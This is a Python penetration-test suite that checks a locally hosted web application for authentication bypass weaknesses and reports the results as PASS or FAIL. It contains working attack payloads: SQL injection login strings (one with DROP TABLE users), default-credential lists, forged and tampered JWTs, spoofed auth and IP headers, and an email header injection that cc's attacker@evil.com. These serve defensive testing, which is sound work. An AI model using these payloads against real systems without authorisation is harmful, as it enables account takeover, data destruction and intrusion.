#!/usr/bin/env python3
"""
Authentication Bypass Security Tests
Comprehensive testing of all authentication bypass scenarios
"""

import asyncio
import json
import pytest
import requests
import time
from datetime import datetime
from typing import Dict, List, Any
import base64
import hashlib
import jwt as pyjwt

class AuthenticationBypassTester:
    """Test suite for authentication bypass vulnerabilities"""
    
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.test_results = []
        
    async def run_all_tests(self) -> List[Dict[str, Any]]:
        """Run all authentication bypass tests"""
        print("🔐 Testing Authentication Bypass Scenarios...")
        
        test_methods = [
            self.test_sql_injection_bypass,
            self.test_weak_password_bypass,
            self.test_brute_force_bypass,
            self.test_session_fixation_bypass,
            self.test_jwt_bypass,
            self.test_authentication_header_bypass,
            self.test_parameter_pollution_bypass,
            self.test_timing_attack_bypass,
            self.test_default_credential_bypass,
            self.test_password_reset_bypass
        ]
        
        for test_method in test_methods:
            try:
                result = await test_method()
                self.test_results.append(result)
            except Exception as e:
                self.test_results.append({
                    "test": test_method.__name__,
                    "status": "ERROR",
                    "error": str(e),
                    "timestamp": datetime.now().isoformat()
                })
        
        return self.test_results
    
    async def test_sql_injection_bypass(self) -> Dict[str, Any]:
        """Test SQL injection authentication bypass"""
        test_name = "SQL Injection Authentication Bypass"
        vulnerabilities = []
        
        sql_payloads = [
            {"username": "admin' OR '1'='1", "password": "password"},
            {"username": "admin'/*", "password": "*/OR/*'1'='1"},
            {"username": "admin' OR 1=1--", "password": "anything"},
            {"username": "admin'; DROP TABLE users;--", "password": "password"},
            {"username": "' UNION SELECT 1,2,3--", "password": "password"},
            {"username": "admin' OR 'a'='a", "password": "admin' OR 'a'='a"},
            {"username": "admin'||'1'='1", "password": "password"},
            {"username": "admin' AND (SELECT COUNT(*) FROM users) > 0--", "password": "password"}
        ]
        
        for i, payload in enumerate(sql_payloads):
            try:
                response = self.session.post(
                    f"{self.base_url}/api/auth/login",
                    json=payload,
                    timeout=10
                )
                
                # Check if authentication was bypassed
                if response.status_code == 200:
                    response_data = response.json() if response.headers.get('content-type', '').startswith('application/json') else {}
                    
                    if any(key in response_data for key in ['token', 'access_token', 'session_id']):
                        vulnerabilities.append({
                            "payload": payload,
                            "response_code": response.status_code,
                            "response_data": response_data,
                            "severity": "CRITICAL",
                            "description": "SQL injection allowed authentication bypass"
                        })
                
                # Check for SQL error messages (information disclosure)
                if any(error in response.text.lower() for error in 
                       ['sql', 'syntax error', 'mysql', 'postgresql', 'sqlite']):
                    vulnerabilities.append({
                        "payload": payload,
                        "response_code": response.status_code,
                        "severity": "HIGH",
                        "description": "SQL error message disclosed, indicating potential SQL injection"
                    })
                    
            except Exception as e:
                continue
        
        return {
            "test": test_name,
            "status": "FAIL" if vulnerabilities else "PASS",
            "vulnerabilities": vulnerabilities,
            "total_payloads": len(sql_payloads),
            "successful_bypasses": len([v for v in vulnerabilities if v.get("severity") == "CRITICAL"])
        }
    
    async def test_weak_password_bypass(self) -> Dict[str, Any]:
        """Test weak password authentication bypass"""
        test_name = "Weak Password Authentication Bypass"
        vulnerabilities = []
        
        weak_credentials = [
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "password"},
            {"username": "admin", "password": "123456"},
            {"username": "administrator", "password": "administrator"},
            {"username": "root", "password": "root"},
            {"username": "test", "password": "test"},
            {"username": "user", "password": "user"},
            {"username": "admin", "password": ""},
            {"username": "", "password": ""},
            {"username": "admin", "password": "admin123"},
            {"username": "demo", "password": "demo"},
            {"username": "guest", "password": "guest"}
        ]
        
        for credentials in weak_credentials:
            try:
                response = self.session.post(
                    f"{self.base_url}/api/auth/login",
                    json=credentials,
                    timeout=10
                )
                
                if response.status_code == 200:
                    response_data = response.json() if response.headers.get('content-type', '').startswith('application/json') else {}
                    
                    if any(key in response_data for key in ['token', 'access_token', 'session_id']):
                        vulnerabilities.append({
                            "credentials": credentials,
                            "response_code": response.status_code,
                            "severity": "HIGH",
                            "description": f"Weak credentials accepted: {credentials['username']}/{credentials['password']}"
                        })
                        
            except Exception:
                continue
        
        return {
            "test": test_name,
            "status": "FAIL" if vulnerabilities else "PASS",
            "vulnerabilities": vulnerabilities,
            "total_attempts": len(weak_credentials),
            "successful_logins": len(vulnerabilities)
        }
    
    async def test_brute_force_bypass(self) -> Dict[str, Any]:
        """Test brute force protection bypass"""
        test_name = "Brute Force Protection Bypass"
        vulnerabilities = []
        
        # Test rapid login attempts
        failed_attempts = 0
        rate_limited = False
        
        for i in range(15):  # Try 15 rapid attempts
            try:
                start_time = time.time()
                response = self.session.post(
                    f"{self.base_url}/api/auth/login",
                    json={"username": "admin", "password": f"wrong{i}"},
                    timeout=5
                )
                end_time = time.time()
                
                if response.status_code == 429:  # Too Many Requests
                    rate_limited = True
                    break
                elif response.status_code == 401:
                    failed_attempts += 1
                
                # Check if response is artificially delayed (rate limiting)
                if end_time - start_time > 2.0:  # More than 2 seconds
                    rate_limited = True
                    break
                    
                time.sleep(0.1)  # Small delay between attempts
                
            except Exception:
                continue
        
        # If we made many failed attempts without rate limiting
        if failed_attempts >= 10 and not rate_limited:
            vulnerabilities.append({
                "failed_attempts": failed_attempts,
                "rate_limited": rate_limited,
                "severity": "MEDIUM",
                "description": f"No rate limiting after {failed_attempts} failed login attempts"
            })
        
        # Test IP rotation bypass
        headers_list = [
            {"X-Forwarded-For": "192.168.1.100"},
            {"X-Real-IP": "10.0.0.100"},
            {"X-Originating-IP": "172.16.1.100"},
            {"X-Remote-IP": "203.0.113.100"},
            {"Client-IP": "198.51.100.100"}
        ]
        
        for headers in headers_list:
            try:
                response = self.session.post(
                    f"{self.base_url}/api/auth/login",
                    json={"username": "admin", "password": "wrong"},
                    headers=headers,
                    timeout=5
                )
                
                if response.status_code != 429:  # Should be rate limited
                    vulnerabilities.append({
                        "bypass_headers": headers,
                        "response_code": response.status_code,
                        "severity": "MEDIUM",
                        "description": "Rate limiting bypassed using IP headers"
                    })
                    
            except Exception:
                continue
        
        return {
            "test": test_name,
            "status": "FAIL" if vulnerabilities else "PASS",
            "vulnerabilities": vulnerabilities,
            "failed_attempts": failed_attempts,
            "rate_limited": rate_limited
        }
    
    async def test_session_fixation_bypass(self) -> Dict[str, Any]:
        """Test session fixation bypass"""
        test_name = "Session Fixation Bypass"
        vulnerabilities = []
        
        try:
            # Get initial session
            response1 = self.session.get(f"{self.base_url}/api/auth/status")
            initial_session = self.session.cookies.get('session_id') or self.session.cookies.get('sessionid')
            
            # Attempt login with test credentials
            login_response = self.session.post(
                f"{self.base_url}/api/auth/login",
                json={"username": "testuser", "password": "testpass"}
            )
            
            # Check session after login
            post_login_session = self.session.cookies.get('session_id') or self.session.cookies.get('sessionid')
            
            # Session should change after successful login
            if initial_session and initial_session == post_login_session:
                vulnerabilities.append({
                    "initial_session": initial_session,
                    "post_login_session": post_login_session,
                    "severity": "MEDIUM",
                    "description": "Session ID not regenerated after login (session fixation vulnerability)"
                })
            
            # Test setting custom session ID
            custom_session = "custom_session_12345"
            self.session.cookies.set('session_id', custom_session)
            
            response = self.session.post(
                f"{self.base_url}/api/auth/login",
                json={"username": "testuser", "password": "testpass"}
            )
            
            final_session = self.session.cookies.get('session_id')
            
            if final_session == custom_session:
                vulnerabilities.append({
                    "custom_session": custom_session,
                    "final_session": final_session,
                    "severity": "HIGH",
                    "description": "Application accepts attacker-controlled session ID"
                })
                
        except Exception as e:
            pass
        
        return {
            "test": test_name,
            "status": "FAIL" if vulnerabilities else "PASS",
            "vulnerabilities": vulnerabilities
        }
    
    async def test_jwt_bypass(self) -> Dict[str, Any]:
        """Test JWT authentication bypass"""
        test_name = "JWT Authentication Bypass"
        vulnerabilities = []
        
        # First, try to get a valid JWT
        try:
            login_response = self.session.post(
                f"{self.base_url}/api/auth/login",
                json={"username": "testuser", "password": "testpass"}
            )
            
            token = None
            if login_response.status_code == 200:
                response_data = login_response.json()
                token = response_data.get("access_token") or response_data.get("token")
            
            if token:
                # Test 1: None algorithm bypass
                try:
                    header, payload, signature = token.split('.')
                    
                    # Decode and modify header
                    header_data = json.loads(base64.b64decode(header + '=='))
                    header_data['alg'] = 'none'
                    
                    # Create malicious token
                    malicious_header = base64.b64encode(json.dumps(header_data).encode()).decode().rstrip('=')
                    malicious_token = f"{malicious_header}.{payload}."
                    
                    # Test with malicious token
                    response = self.session.get(
                        f"{self.base_url}/api/auth/profile",
                        headers={"Authorization": f"Bearer {malicious_token}"}
                    )
                    
                    if response.status_code == 200:
                        vulnerabilities.append({
                            "attack": "none_algorithm",
                            "token": malicious_token[:50] + "...",
                            "severity": "CRITICAL",
                            "description": "JWT accepts 'none' algorithm, allowing signature bypass"
                        })
                        
                except Exception:
                    pass
                
                # Test 2: Weak secret brute force
                weak_secrets = ["secret", "123456", "password", "jwt", "key", "test"]
                
                for secret in weak_secrets:
                    try:
                        decoded = pyjwt.decode(token, secret, algorithms=["HS256"])
                        
                        vulnerabilities.append({
                            "attack": "weak_secret",
                            "secret": secret,
                            "severity": "CRITICAL",
                            "description": f"JWT uses weak secret: {secret}"
                        })
                        break
                        
                    except Exception:
                        continue
                
                # Test 3: Algorithm confusion
                try:
                    # Try to use RS256 public key as HS256 secret
                    rsa_public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4f5wg5l2hKsTeNem/V41fGnJm6gOdrj8ym3rFkEjWT2btf
-----END PUBLIC KEY-----"""
                    
                    decoded = pyjwt.decode(token, rsa_public_key, algorithms=["HS256"])
                    
                    vulnerabilities.append({
                        "attack": "algorithm_confusion",
                        "severity": "CRITICAL",
                        "description": "JWT vulnerable to algorithm confusion attack"
                    })
                    
                except Exception:
                    pass
                
                # Test 4: JWT tampering
                try:
                    header, payload, signature = token.split('.')
                    
                    # Decode and modify payload
                    payload_data = json.loads(base64.b64decode(payload + '=='))
                    original_payload = payload_data.copy()
                    
                    # Try to escalate privileges
                    payload_data['role'] = 'admin'
                    payload_data['is_admin'] = True
                    
                    tampered_payload = base64.b64encode(json.dumps(payload_data).encode()).decode().rstrip('=')
                    tampered_token = f"{header}.{tampered_payload}.{signature}"
                    
                    # Test with tampered token
                    response = self.session.get(
                        f"{self.base_url}/api/admin/users",
                        headers={"Authorization": f"Bearer {tampered_token}"}
                    )
                    
                    if response.status_code == 200:
                        vulnerabilities.append({
                            "attack": "jwt_tampering",
                            "original_payload": original_payload,
                            "tampered_payload": payload_data,
                            "severity": "CRITICAL",
                            "description": "JWT signature not properly verified, allowing privilege escalation"
                        })
                        
                except Exception:
                    pass
        
        except Exception:
            pass
        
        return {
            "test": test_name,
            "status": "FAIL" if vulnerabilities else "PASS",
            "vulnerabilities": vulnerabilities
        }
    
    async def test_authentication_header_bypass(self) -> Dict[str, Any]:
        """Test authentication header bypass"""
        test_name = "Authentication Header Bypass"
        vulnerabilities = []
        
        # Test various authentication headers
        auth_headers = [
            {"X-Authenticated-User": "admin"},
            {"X-User": "admin"},
            {"X-Remote-User": "admin"},
            {"X-Forwarded-User": "admin"},
            {"Remote-User": "admin"},
            {"Authentication": "admin"},
            {"Auth-User": "admin"},
            {"X-Auth-User": "admin"},
            {"User": "admin"},
            {"Username": "admin"}
        ]
        
        protected_endpoints = [
            "/api/auth/profile",
            "/api/users",
            "/api/admin/users",
            "/api/settings"
        ]
        
        for endpoint in protected_endpoints:
            for headers in auth_headers:
                try:
                    response = self.session.get(
                        f"{self.base_url}{endpoint}",
                        headers=headers,
                        timeout=10
                    )
                    
                    if response.status_code == 200:
                        vulnerabilities.append({
                            "endpoint": endpoint,
                            "bypass_headers": headers,
                            "response_code": response.status_code,
                            "severity": "HIGH",
                            "description": f"Authentication bypassed using headers on {endpoint}"
                        })
                        
                except Exception:
                    continue
        
        return {
            "test": test_name,
            "status": "FAIL" if vulnerabilities else "PASS",
            "vulnerabilities": vulnerabilities
        }
    
    async def test_parameter_pollution_bypass(self) -> Dict[str, Any]:
        """Test parameter pollution authentication bypass"""
        test_name = "Parameter Pollution Authentication Bypass"
        vulnerabilities = []
        
        # Test parameter pollution in login
        pollution_payloads = [
            {"username": ["admin", "user"], "password": "wrong"},
            {"username": "admin", "password": ["wrong", "admin"]},
            {"username[]": "admin", "password": "wrong"},
            {"username": "admin", "password[]": "admin"}
        ]
        
        for payload in pollution_payloads:
            try:
                response = self.session.post(
                    f"{self.base_url}/api/auth/login",
                    json=payload,
                    timeout=10
                )
                
                if response.status_code == 200:
                    response_data = response.json() if response.headers.get('content-type', '').startswith('application/json') else {}
                    
                    if any(key in response_data for key in ['token', 'access_token', 'session_id']):
                        vulnerabilities.append({
                            "payload": payload,
                            "response_code": response.status_code,
                            "severity": "HIGH",
                            "description": "Parameter pollution allowed authentication bypass"
                        })
                        
            except Exception:
                continue
        
        return {
            "test": test_name,
            "status": "FAIL" if vulnerabilities else "PASS",
            "vulnerabilities": vulnerabilities
        }
    
    async def test_timing_attack_bypass(self) -> Dict[str, Any]:
        """Test timing attack authentication bypass"""
        test_name = "Timing Attack Authentication Bypass"
        vulnerabilities = []
        
        # Test timing differences between valid and invalid users
        valid_user = "admin"
        invalid_user = "nonexistent_user_12345"
        
        valid_times = []
        invalid_times = []
        
        # Test valid user with wrong password
        for i in range(10):
            try:
                start_time = time.time()
                response = self.session.post(
                    f"{self.base_url}/api/auth/login",
                    json={"username": valid_user, "password": f"wrong{i}"},
                    timeout=10
                )
                end_time = time.time()
                
                valid_times.append(end_time - start_time)
                
            except Exception:
                continue
        
        # Test invalid user
        for i in range(10):
            try:
                start_time = time.time()
                response = self.session.post(
                    f"{self.base_url}/api/auth/login",
                    json={"username": invalid_user, "password": f"wrong{i}"},
                    timeout=10
                )
                end_time = time.time()
                
                invalid_times.append(end_time - start_time)
                
            except Exception:
                continue
        
        # Analyze timing differences
        if valid_times and invalid_times:
            avg_valid = sum(valid_times) / len(valid_times)
            avg_invalid = sum(invalid_times) / len(invalid_times)
            
            # Significant timing difference indicates timing attack vulnerability
            if abs(avg_valid - avg_invalid) > 0.1:  # 100ms difference
                vulnerabilities.append({
                    "avg_valid_time": avg_valid,
                    "avg_invalid_time": avg_invalid,
                    "time_difference": abs(avg_valid - avg_invalid),
                    "severity": "LOW",
                    "description": "Timing difference reveals user existence (username enumeration)"
                })
        
        return {
            "test": test_name,
            "status": "FAIL" if vulnerabilities else "PASS",
            "vulnerabilities": vulnerabilities
        }
    
    async def test_default_credential_bypass(self) -> Dict[str, Any]:
        """Test default credential bypass"""
        test_name = "Default Credential Bypass"
        vulnerabilities = []
        
        # Common default credentials for various systems
        default_credentials = [
            {"username": "admin", "password": "admin"},
            {"username": "administrator", "password": "password"},
            {"username": "root", "password": "toor"},
            {"username": "sa", "password": ""},
            {"username": "postgres", "password": "postgres"},
            {"username": "mysql", "password": "mysql"},
            {"username": "oracle", "password": "oracle"},
            {"username": "demo", "password": "demo"},
            {"username": "test", "password": "test"},
            {"username": "guest", "password": "guest"},
            {"username": "user", "password": "password"},
            {"username": "backup", "password": "backup"}
        ]
        
        for credentials in default_credentials:
            try:
                response = self.session.post(
                    f"{self.base_url}/api/auth/login",
                    json=credentials,
                    timeout=10
                )
                
                if response.status_code == 200:
                    response_data = response.json() if response.headers.get('content-type', '').startswith('application/json') else {}
                    
                    if any(key in response_data for key in ['token', 'access_token', 'session_id']):
                        vulnerabilities.append({
                            "credentials": credentials,
                            "response_code": response.status_code,
                            "severity": "CRITICAL",
                            "description": f"Default credentials work: {credentials['username']}/{credentials['password']}"
                        })
                        
            except Exception:
                continue
        
        return {
            "test": test_name,
            "status": "FAIL" if vulnerabilities else "PASS",
            "vulnerabilities": vulnerabilities
        }
    
    async def test_password_reset_bypass(self) -> Dict[str, Any]:
        """Test password reset bypass"""
        test_name = "Password Reset Bypass"
        vulnerabilities = []
        
        # Test password reset functionality
        reset_payloads = [
            {"email": "admin@example.com"},
            {"email": "admin@localhost"},
            {"email": "admin@admin.com"},
            {"email": "test@test.com"},
            {"email": ""},
            {"email": "admin@example.com' OR '1'='1"},
            {"email": "../admin@example.com"},
            {"email": "admin@example.com\r\ncc: attacker@evil.com"}
        ]
        
        for payload in reset_payloads:
            try:
                response = self.session.post(
                    f"{self.base_url}/api/auth/reset-password",
                    json=payload,
                    timeout=10
                )
                
                # Check for successful reset indication
                if response.status_code == 200 and "reset" in response.text.lower():
                    # Check if user existence is revealed
                    if "user not found" in response.text.lower() or "invalid email" in response.text.lower():
                        vulnerabilities.append({
                            "payload": payload,
                            "response_code": response.status_code,
                            "severity": "LOW",
                            "description": "Password reset reveals user existence"
                        })
                    else:
                        vulnerabilities.append({
                            "payload": payload,
                            "response_code": response.status_code,
                            "severity": "MEDIUM",
                            "description": "Password reset accepts any email"
                        })
                
                # Test for email header injection
                if payload["email"] and "\r\n" in payload["email"]:
                    vulnerabilities.append({
                        "payload": payload,
                        "response_code": response.status_code,
                        "severity": "HIGH",
                        "description": "Email header injection possible in password reset"
                    })
                    
            except Exception:
                continue
        
        return {
            "test": test_name,
            "status": "FAIL" if vulnerabilities else "PASS",
            "vulnerabilities": vulnerabilities
        }
    
    def generate_report(self) -> Dict[str, Any]:
        """Generate comprehensive test report"""
        total_tests = len(self.test_results)
        failed_tests = len([t for t in self.test_results if t.get("status") == "FAIL"])
        total_vulnerabilities = sum(len(t.get("vulnerabilities", [])) for t in self.test_results)
        
        severity_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
        
        for test in self.test_results:
            for vuln in test.get("vulnerabilities", []):
                severity = vuln.get("severity", "LOW")
                severity_counts[severity] += 1
        
        return {
            "summary": {
                "total_tests": total_tests,
                "passed_tests": total_tests - failed_tests,
                "failed_tests": failed_tests,
                "total_vulnerabilities": total_vulnerabilities,
                "severity_breakdown": severity_counts
            },
            "test_results": self.test_results,
            "timestamp": datetime.now().isoformat()
        }

async def main():
    """Main function for running authentication bypass tests"""
    tester = AuthenticationBypassTester()
    await tester.run_all_tests()
    
    report = tester.generate_report()
    
    print("\n" + "="*60)
    print("🔐 AUTHENTICATION BYPASS TEST SUMMARY")
    print("="*60)
    print(f"Total Tests: {report['summary']['total_tests']}")
    print(f"Passed: {report['summary']['passed_tests']}")
    print(f"Failed: {report['summary']['failed_tests']}")
    print(f"Total Vulnerabilities: {report['summary']['total_vulnerabilities']}")
    print(f"Critical: {report['summary']['severity_breakdown']['CRITICAL']}")
    print(f"High: {report['summary']['severity_breakdown']['HIGH']}")
    print(f"Medium: {report['summary']['severity_breakdown']['MEDIUM']}")
    print(f"Low: {report['summary']['severity_breakdown']['LOW']}")
    print("="*60)

if __name__ == "__main__":
    asyncio.run(main())